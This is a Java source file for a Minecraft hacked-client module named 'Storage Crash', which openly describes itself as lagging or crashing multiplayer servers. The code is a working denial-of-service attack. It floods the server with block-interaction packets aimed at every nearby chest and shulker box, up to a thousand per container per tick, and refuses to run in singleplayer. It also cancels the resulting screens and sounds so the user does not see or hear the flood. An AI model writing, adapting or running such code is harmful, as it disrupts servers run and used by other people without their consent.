package mathax.client.systems.modules.crash;

import mathax.client.eventbus.EventHandler;
import mathax.client.events.game.GameLeftEvent;
import mathax.client.events.game.OpenScreenEvent;
import mathax.client.events.world.PlaySoundEvent;
import mathax.client.events.world.TickEvent;
import mathax.client.settings.BoolSetting;
import mathax.client.settings.IntSetting;
import mathax.client.settings.Setting;
import mathax.client.settings.SettingGroup;
import mathax.client.systems.modules.Categories;
import mathax.client.systems.modules.Module;
import mathax.client.utils.world.BlockIterator;
import net.minecraft.block.AbstractChestBlock;
import net.minecraft.block.Block;
import net.minecraft.block.ShulkerBoxBlock;
import net.minecraft.client.gui.screen.ingame.AbstractInventoryScreen;
import net.minecraft.client.gui.screen.ingame.HandledScreen;
import net.minecraft.item.Items;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;
import org.lwjgl.glfw.GLFW;

import java.util.Objects;

public class StorageCrash extends Module {

    private final Setting<Integer> amount;

    private final Setting<Boolean> noSound;

    private final Setting<Boolean> autoDisable;

    private final Setting<Boolean> insideBlock;

    private final Setting<Integer> sequence;

    public StorageCrash() {
        super(Categories.Crash, Items.TRAPPED_CHEST, "Storage Crash", "CRYSTAL || Attempts to lag / crash servers by sending broken storage opening packets.");

        SettingGroup sgGeneral = settings.getDefaultGroup();

        amount = sgGeneral.add(new IntSetting.Builder()
            .name("amount")
            .description("How many packets to send to the server per container block per tick.")
            .defaultValue(100)
            .min(1)
            .sliderMax(1000)
            .build());
        noSound = sgGeneral.add(new BoolSetting.Builder()
            .name("no-sound")
            .description("Blocks the noisy container opening/closing sounds.")
            .defaultValue(false)
            .build());
        autoDisable = sgGeneral.add(new BoolSetting.Builder()
            .name("Auto Disable")
            .description("Disables module on kick.")
            .defaultValue(true)
            .build());
        insideBlock = sgGeneral.add(new BoolSetting.Builder()
            .name("InsideBlock")
            .description("Choose InsideBlock.")
            .defaultValue(false)
            .build());
        sequence = sgGeneral.add(new IntSetting.Builder()
            .name("Sequence")
            .description("Choose the sequence")
            .defaultValue(0)
            .min(0)
            .sliderMin(0)
            .sliderMax(1000)
            .build());
    }

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        if(!mc.isInSingleplayer()) {
            if (GLFW.glfwGetKey(mc.getWindow().getHandle(), GLFW.GLFW_KEY_ESCAPE) == GLFW.GLFW_PRESS) {
                toggle();
                assert mc.player != null;
                mc.player.closeHandledScreen();
            }

            BlockIterator.register(4, 4, ((blockPos, blockState) -> {
                Block block = blockState.getBlock();
                if (block instanceof AbstractChestBlock || block instanceof ShulkerBoxBlock) {

                    BlockHitResult bhr = new BlockHitResult(new Vec3d(blockPos.getX(), blockPos.getY(), blockPos.getZ()), Direction.DOWN, blockPos, insideBlock.get());
                    PlayerInteractBlockC2SPacket openPacket = new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, bhr, sequence.get());

                    int i = 0;
                    while (true) {
                        if (i < amount.get()) {
                            Objects.requireNonNull(mc.getNetworkHandler()).sendPacket(openPacket);
                            i++;
                        } else {
                            break;
                        }
                    }
                }
            }));
        } else {
            error("You must be on a server, toggling.");
            toggle();
        }
    }

    @EventHandler
    private void onScreenOpen(OpenScreenEvent event) {
        if (event.screen != null) {
            if (mc.isPaused() || event.screen instanceof AbstractInventoryScreen || (!(event.screen instanceof HandledScreen))) {
                return;
            }
            event.setCancelled(true);
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (!autoDisable.get()) {
            return;
        }
        toggle();
    }

    @EventHandler
    private void onPlaySound(PlaySoundEvent event) {
        if (!noSound.get() || !shouldCancel(event)) {
            return;
        }
        event.cancel();
    }

    private boolean shouldCancel(PlaySoundEvent event) {
        return event.sound.getId().toString().equals("minecraft:block.chest.open") || event.sound.getId().toString().equals("minecraft:block.chest.close") || event.sound.getId().toString().equals("minecraft:block.shulker_box.open") || event.sound.getId().toString().equals("minecraft:block.shulker_box.close") || event.sound.getId().toString().equals("minecraft:block.ender_chest.open") || event.sound.getId().toString().equals("minecraft:block.ender_chest.close");
    }
}
